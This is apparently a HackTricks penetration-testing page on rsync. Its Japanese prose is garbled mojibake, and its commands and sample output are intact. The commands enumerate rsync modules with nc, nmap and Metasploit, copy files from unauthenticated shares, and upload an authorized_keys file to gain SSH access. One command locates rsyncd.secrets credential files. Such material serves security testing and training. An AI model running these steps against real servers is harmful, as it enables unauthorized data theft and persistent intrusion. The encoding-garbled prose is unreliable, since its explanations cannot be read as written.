# 873 - Pentesting Rsync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **åŸºæœ¬æƒ…å ±**

From [wikipedia](https://en.wikipedia.org/wiki/Rsync):

> **rsync** ã¯ã€ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã¨å¤–éƒ¨ãƒãƒ¼ãƒ‰ãƒ‰ãƒ©ã‚¤ãƒ–é–“ã€ã¾ãŸã¯ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã•ã‚ŒãŸã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿é–“ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åŠ¹ç‡çš„ã«[è»¢é€](https://en.wikipedia.org/wiki/File\_transfer)ãŠã‚ˆã³[åŒæœŸ](https://en.wikipedia.org/wiki/File\_synchronization)ã™ã‚‹ãŸã‚ã®ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£ã§ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã®[å¤‰æ›´æ™‚é–“](https://en.wikipedia.org/wiki/Timestamping\_\(computing\))ã¨ã‚µã‚¤ã‚ºã‚’æ¯”è¼ƒã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦è¡Œã„ã¾ã™ã€‚[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) ä¸€èˆ¬çš„ã«[Unixç³»](https://en.wikipedia.org/wiki/Unix-like)ã®[ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ](https://en.wikipedia.org/wiki/Operating\_system)ã§è¦‹ã‚‰ã‚Œã¾ã™ã€‚rsyncã‚¢ãƒ«ã‚´ãƒªã‚ºãƒ ã¯[ãƒ‡ãƒ«ã‚¿ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°](https://en.wikipedia.org/wiki/Delta\_encoding)ã®ä¸€ç¨®ã§ã‚ã‚Šã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ä½¿ç”¨é‡ã‚’æœ€å°é™ã«æŠ‘ãˆã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚[Zlib](https://en.wikipedia.org/wiki/Zlib)ã¯è¿½åŠ ã®[ãƒ‡ãƒ¼ã‚¿åœ§ç¸®](https://en.wikipedia.org/wiki/Data\_compression)ã«ä½¿ç”¨ã•ã‚Œã‚‹ã“ã¨ãŒã‚ã‚Šã€[\[3\]](https://en.wikipedia.org/wiki/Rsync#cite\_note-man\_page-3) [SSH](https://en.wikipedia.org/wiki/Secure\_Shell)ã¾ãŸã¯[stunnel](https://en.wikipedia.org/wiki/Stunnel)ã¯ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒ¼ãƒˆ:** 873
```
PORT    STATE SERVICE REASON
873/tcp open  rsync   syn-ack
```
## åˆ—æŒ™

### ãƒãƒŠãƒ¼ã¨æ‰‹å‹•é€šä¿¡
```bash
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0        <--- You receive this banner with the version from the server
@RSYNCD: 31.0        <--- Then you send the same info
#list                <--- Then you ask the sever to list
raidroot             <--- The server starts enumerating
USBCopy
NAS_Public
_NAS_Recycle_TOSRAID	<--- Enumeration finished
@RSYNCD: EXIT         <--- Sever closes the connection


#Now lets try to enumerate "raidroot"
nc -vn 127.0.0.1 873
(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
raidroot
@RSYNCD: AUTHREQD 7H6CqsHCPG06kRiFkKwD8g    <--- This means you need the password
```
### **å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã®åˆ—æŒ™**

**Rsyncãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«**ã¯ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å¯èƒ½æ€§ã®ã‚ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå…±æœ‰**ã¨ã—ã¦èªè­˜ã•ã‚Œã¾ã™ã€‚åˆ©ç”¨å¯èƒ½ãªãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ç‰¹å®šã—ã€ãã‚Œã‚‰ãŒãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’å¿…è¦ã¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ï¼š
```bash
nmap -sV --script "rsync-list-modules" -p <PORT> <IP>
msf> use auxiliary/scanner/rsync/modules_list

# Example with IPv6 and alternate port
rsync -av --list-only rsync://[dead:beef::250:56ff:feb9:e90a]:8730
```
æ³¨æ„ã™ã¹ãã¯ã€ã„ãã¤ã‹ã®å…±æœ‰ãŒãƒªã‚¹ãƒˆã«è¡¨ç¤ºã•ã‚Œãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€ãã‚Œã‚‰ãŒéš ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã§ã™ã€‚ã•ã‚‰ã«ã€ã„ãã¤ã‹ã®å…±æœ‰ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã¯ç‰¹å®šã®**è³‡æ ¼æƒ…å ±**ã«åˆ¶é™ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã€**ã€Œã‚¢ã‚¯ã‚»ã‚¹æ‹’å¦ã€**ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã§ç¤ºã•ã‚Œã¾ã™ã€‚

### [**ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹**](../generic-methodologies-and-resources/brute-force.md#rsync)

### æ‰‹å‹•Rsyncã®ä½¿ç”¨

**ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ãƒªã‚¹ãƒˆ**ã‚’å–å¾—ã—ãŸå¾Œã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã¯èªè¨¼ãŒå¿…è¦ã‹ã©ã†ã‹ã«ã‚ˆã£ã¦ç•°ãªã‚Šã¾ã™ã€‚èªè¨¼ãŒãªã„å ´åˆã€å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰ãƒ­ãƒ¼ã‚«ãƒ«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã¸ã®**ãƒªã‚¹ãƒˆ**ãŠã‚ˆã³**ã‚³ãƒ”ãƒ¼**ã¯æ¬¡ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã¾ã™ï¼š
```bash
# Listing a shared folder
rsync -av --list-only rsync://192.168.0.123/shared_name

# Copying files from a shared folder
rsync -av rsync://192.168.0.123:8730/shared_name ./rsyn_shared
```
ã“ã®ãƒ—ãƒ­ã‚»ã‚¹ã¯**å†å¸°çš„ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è»¢é€**ã—ã€å±æ€§ã¨æ¨©é™ã‚’ä¿æŒã—ã¾ã™ã€‚

**è³‡æ ¼æƒ…å ±**ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€å…±æœ‰ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‹ã‚‰ã®ãƒªã‚¹ãƒˆä½œæˆã¨ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã¯æ¬¡ã®ã‚ˆã†ã«è¡Œã†ã“ã¨ãŒã§ãã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆãŒè¡¨ç¤ºã•ã‚Œã¾ã™ï¼š
```bash
rsync -av --list-only rsync://username@192.168.0.123/shared_name
rsync -av rsync://username@192.168.0.123:8730/shared_name ./rsyn_shared
```
ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’**ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã«ã¯ã€ã‚¢ã‚¯ã‚»ã‚¹ç”¨ã®_**authorized_keys**_ãƒ•ã‚¡ã‚¤ãƒ«ãªã©ã‚’ä½¿ç”¨ã—ã¾ã™:
```bash
rsync -av home_user/.ssh/ rsync://username@192.168.0.123/home_user/.ssh
```
## POST

rsyncdè¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ã«ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™:
```bash
find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«å†…ã® _secrets file_ ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¯ã€rsyncd èªè¨¼ã®ãŸã‚ã® **ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰** ã‚’å«ã‚€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒ‡ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®
* [https://www.smeegesec.com/2016/12/pentesting-rsync.html](https://www.smeegesec.com/2016/12/pentesting-rsync.html)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
